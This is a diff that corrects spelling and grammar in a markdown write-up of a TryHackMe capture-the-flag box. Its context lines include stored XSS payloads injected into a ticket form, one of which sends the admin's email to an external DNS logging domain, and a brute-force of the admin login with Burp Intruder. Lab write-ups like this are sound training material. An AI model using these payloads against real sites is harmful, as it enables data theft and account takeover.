@@ -60,7 +60,7 @@ nikto -h 10.10.28.159
 
 ![](./assets/dashboard.png)
 
-3. Cheking the webpage we see the message box is vunerable to XSS injection
+3. Checking the webpage we see the message box is vulnerable to XSS injection
 
 ![](./assets/createticket.png)
 
@@ -75,10 +75,10 @@ Hint: Our HTTP & DNS Logging tool on http://10.10.10.100 may come in useful!
 
 ## DNS time!
 
-Using the found xss bug we can use this to make callbacks to our machine and from the hint we got earlier. 
-http://10.10.10.100 This is a DNS service that logs dns calls for us. We can also use a site like this, http://pingb.in/
+Using the found XSS bug we can use this to make callbacks to our machine and from the hint we got earlier. 
+http://10.10.10.100 This is a DNS service that logs DNS calls for us. We can also use a site like this, http://pingb.in/
 
-Knowing we can use xss lets try a call back to the dns service. 
+Knowing we can use XSS let's try a call back to the DNS service. 
 
 ```js
 </textarea><img/src=x onerror="//8ba7c46d7ea59d575b71ef3126651b6a.log.tryhackme.tech/"/>
@@ -88,9 +88,9 @@ This gets the call back four times, 3 from us and once from the server (admin is
 
 ![](./assets/recievedadmin.png)
 
-Now lets try to get some data back!
+Now let's try to get some data back!
 
-I tried cookies for a while but realised we only needed the admins email (always keep in mind the scope and spec!)
+I tried cookies for a while but realised we only needed the admin's email (always keep in mind the scope and spec!)
 
 New payload
 
@@ -109,7 +109,7 @@ This came back!
 
 ![](./assets/test.png)
 
-Now we can get the admins email address, but we will have to swap a few charaters to not break the url to the dns service (escaping chars like @.')
+Now we can get the admins email address, but we will have to swap a few characters to not break the URL to the DNS service (escaping chars like @.')
 
 ```js
 </textarea><script>
@@ -118,19 +118,19 @@ email = email.replace("@", "8")
 email = email.replace(".", "0")
 document.location = "http://"+ email +".8ba7c46d7ea59d575b71ef3126651b6a.log.tryhackme.tech"</script>
 ```
-Press Create ticket and check the results on the service http://10.10.10.100
+Press Create a ticket and check the results on the service http://10.10.10.100
 
 ![](./assets/admin1.png)
 
 We see the admin email and ours!
 
-Now we can brute force the login page for the admins password as we have the email now.
+Now we can brute force the login page for the admin's password as we have the email now.
 
 Using Burp suite's intruder module we can select the password and then feed in a list of passwords on the payload's tab
 
 ![](./assets/login1.png)
 
-After a short while we get a hit. 
+After a short while, we get a hit. 
 
 ![](./assets/brutewin.png)
 
@@ -147,6 +147,4 @@ And the final flag!
 I hope you enjoyed this box as much as me.
 
 Thanks to Adam for the box and good lessons! 
-
-
 
